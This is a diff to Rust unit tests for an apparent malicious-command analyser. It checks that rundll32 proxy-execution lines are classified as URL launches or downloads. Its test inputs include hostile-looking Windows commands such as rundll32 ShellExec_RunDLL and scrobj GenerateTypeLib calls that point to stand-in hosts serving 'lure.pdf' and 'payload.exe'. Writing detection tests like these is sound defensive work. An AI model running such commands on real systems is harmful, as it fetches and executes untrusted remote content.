@@ -6844,6 +6844,25 @@ mod misc_handler_tests {
     }
 
     #[test]
+    fn rundll32_shellexec_rundll_url_emits_url_launch() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"rundll32.exe shell32.dll,ShellExec_RunDLL "https://rundll32-shell.example/lure.pdf""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlLaunch { url, .. }
+                    if url == "https://rundll32-shell.example/lure.pdf"
+            )),
+            "rundll32 ShellExec_RunDLL URL launch not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn rundll32_scrobj_generatetypelib_url_argument_emits_download() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -13408,7 +13427,8 @@ rundll32 url.dll,FileProtocolHandler https://rundll32-launch.example/extensionle
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
             r#"rundll32.exe shimgvw.dll,ImageView_Fullscreen "https://rundll32-image-deob.example/pic.jpg"
-rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj-deob.example/payload.exe"#,
+rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj-deob.example/payload.exe
+rundll32.exe shell32.dll,ShellExec_RunDLL https://rundll32-shell-deob.example/lure.pdf"#,
             &mut env,
         );
         assert!(
@@ -13433,14 +13453,30 @@ rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj-deob.example/pay
             "missing rundll32 scrobj Download in deob text: {:?}",
             env.traits
         );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlLaunch { url, .. }
+                        if url == "https://rundll32-shell-deob.example/lure.pdf"
+                )
+            }),
+            "missing rundll32 ShellExec_RunDLL UrlLaunch in deob text: {:?}",
+            env.traits
+        );
         for generic in [
             "https://rundll32-image-deob.example/pic.jpg",
             "https://rundll32-scrobj-deob.example/payload.exe",
+            "https://rundll32-shell-deob.example/lure.pdf",
         ] {
             assert!(
-                !env.traits
-                    .iter()
-                    .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == generic)),
+                !env.traits.iter().any(|t| {
+                    matches!(
+                        t,
+                        Trait::DownloadInDeobText { src, .. }
+                            | Trait::UrlArgument { url: src, .. } if src == generic
+                    )
+                }),
                 "rundll32 typed URL double-emitted as generic: {:?}",
                 env.traits
             );
